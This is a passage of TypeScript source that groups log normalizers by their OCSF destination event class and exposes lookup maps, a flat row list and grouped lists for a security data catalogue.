const BLUEPRINTS_BY_ID = new Map(NORMALIZER_BLUEPRINTS.map((bp) => [bp.identifier, bp]))

export function getNormalizerBlueprint(identifier: string): NormalizerBlueprint | undefined {
  return BLUEPRINTS_BY_ID.get(identifier)
}

/** OCSF event class (fields + metadata) backing a data model, keyed by group id. */
export function getOcsfClass(groupId: string): TargetClass | undefined {
  return (TARGET_CLASSES as Record<string, TargetClass>)[groupId]
}

/** All OCSF event classes, in canonical group order. */
export const OCSF_CLASSES: TargetClass[] = (
  [
    "authentication",
    "api-activity",
    "process-activity",
    "network-activity",
    "dns-activity",
    "detection-finding",
  ] as TargetGroupId[]
).map((id) => TARGET_CLASSES[id])

function toRow(bp: NormalizerBlueprint): NormalizerRow {
  return {
    identifier: bp.identifier,
    displayName: bp.displayName,
    sourceParser: bp.sourceParser,
    targetEventClass: bp.targetEventClass,
    type: bp.type,
    latestVersion: bp.latestVersion,
    creator: bp.creator,
  }
}

/** Flat list (kept for search / backwards compatibility). */
export const NORMALIZERS: NormalizerRow[] = NORMALIZER_BLUEPRINTS.map(toRow)

const GROUP_ORDER: TargetGroupId[] = [
  "authentication",
  "api-activity",
  "process-activity",
  "network-activity",
  "dns-activity",
  "detection-finding",
]

/** Normalizers grouped by their OCSF destination event class. */
export const NORMALIZER_GROUPS: NormalizerGroup[] = GROUP_ORDER.map((groupId) => {
  const target = TARGET_CLASSES[groupId]
  return {
    id: target.id,
    name: target.name,
    classUid: target.classUid,
    category: target.category,
    rows: NORMALIZER_BLUEPRINTS.filter((bp) => bp.targetGroupId === groupId).map(toRow),
  }
})
